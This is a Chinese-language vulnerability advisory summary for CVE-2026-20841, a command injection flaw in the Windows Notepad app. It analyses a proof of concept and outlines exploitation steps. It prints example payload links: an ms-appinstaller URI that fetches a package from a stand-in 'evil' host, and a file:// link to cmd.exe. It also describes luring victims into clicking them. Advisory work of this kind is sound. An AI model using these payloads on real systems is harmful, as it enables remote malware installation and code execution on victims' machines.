## CVE-2026-20841 - Windows Notepad App 命令注入/远程代码执行 (Command Injection/Remote Code Execution)

**漏洞编号:** CVE-2026-20841

**漏洞类型:** 命令注入/远程代码执行 (Command Injection/Remote Code Execution)

**影响应用:** Windows Notepad App

**危害等级:** 高

**CVSS评分:** N/A

**影响版本:** Notepad Version < 11.2510

**利用条件:** 需要网络访问；目标Notepad版本小于11.2510；需要用户交互（点击恶意链接）

**POC 可用性:** 3

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

### POC有效性分析

提供的POC由两个Markdown文件组成：`PoC.md`和`README.md`。`PoC.md`中包含两个示例链接，分别利用`ms-appinstaller://`协议和`file://`协议。这些链接旨在演示当Windows Notepad App未能正确处理特殊元素时，可能导致的命令注入或远程代码执行。`ms-appinstaller://`链接指向一个假定的恶意应用程序包（`https://evil/xxx.appx`），而`file://`链接则尝试执行本地的`cmd.exe`。`README.md`文件提供了漏洞的利用条件（Notepad版本小于11.2510）和大致的步骤，并附带了“此POC触发方法尚不明确，仅供参考”的免责声明。这表明此POC并非一个可以直接运行并完整复现漏洞的利用代码，而更多是一个概念性验证，用于说明潜在的攻击向量和触发机制。它清晰地指出了漏洞类型为“命令注入”，并通过示例说明了如何在Notepad中诱导执行系统命令或安装恶意应用。虽然缺乏完整的可执行脚本或环境配置，但其描述的攻击思路和利用条件与公开信息吻合，具有一定的参考价值，尤其是在理解漏洞原理和潜在攻击面方面。

### 利用步骤

1.  **确认受影响版本**: 攻击者首先需要确认目标系统的Windows Notepad App版本是否小于11.2510。如果版本高于此限制，则该漏洞可能无法利用。
2.  **制作恶意载荷**: 攻击者将制作包含恶意链接的文档或内容。这些链接将利用Notepad处理特殊元素时的缺陷，例如：
    *   `ms-appinstaller://?source=https://evil/xxx.appx`：此链接旨在通过`ms-appinstaller`协议尝试从远程恶意服务器（`https://evil/xxx.appx`）安装一个恶意应用程序。
    *   `file://C:/windows/system32/cmd.exe`：此链接旨在尝试直接执行本地的系统命令或应用程序，例如启动命令提示符。
3.  **诱导用户交互**: 攻击者需要将包含这些恶意链接的文档发送给受害者，并通过社会工程学或其他手段，诱导受害者使用Windows Notepad App打开该文档。
4.  **触发漏洞**: 当受害者在Notepad中打开包含恶意链接的文档，并点击了这些链接时，Notepad未能正确地中和链接中的特殊元素，从而导致执行攻击者指定的命令或启动恶意应用程序安装进程。
5.  **远程代码执行**: 如果成功，攻击者将能够在受害者的系统上实现远程代码执行，安装恶意软件，或执行其他未经授权的操作。

### 投毒风险分析

本POC的投毒风险极低，评估为0%。主要原因是该POC并非传统意义上的可执行代码或复杂的脚本，而是由两个纯文本的Markdown文件（`PoC.md`和`README.md`）构成。`PoC.md`文件中包含了两个用于演示漏洞概念的URI链接字符串，一个指向外部假定恶意站点（`https://evil/xxx.appx`），另一个指向本地系统命令（`file://C:/windows/system32/cmd.exe`）。这些链接是漏洞利用的“载荷”示例，而非POC代码本身隐藏的恶意行为。`README.md`文件则仅提供文本描述、利用条件和步骤说明，并未包含任何可执行逻辑。由于POC代码中不包含任何可执行脚本、二进制文件、外部依赖项或混淆的代码片段，因此不存在通过注入恶意代码、后门或执行意外操作来“投毒”此POC的可能性。即使攻击者尝试修改这些Markdown文件，其内容也只会是纯文本的改动，不会直接对用户的系统安全构成威胁。用户在进行防御性安全研究时，主要风险在于理解和复现漏洞时，可能会误将POC中演示的恶意载荷（例如`ms-appinstaller`链接指向的`xxx.appx`）当作真实恶意软件来执行，但这属于复现过程中的操作风险，而非POC代码本身被投毒的风险。

**项目地址:** N/A

**漏洞详情:** https://www.cvedetails.com/cve/CVE-2026-20841/
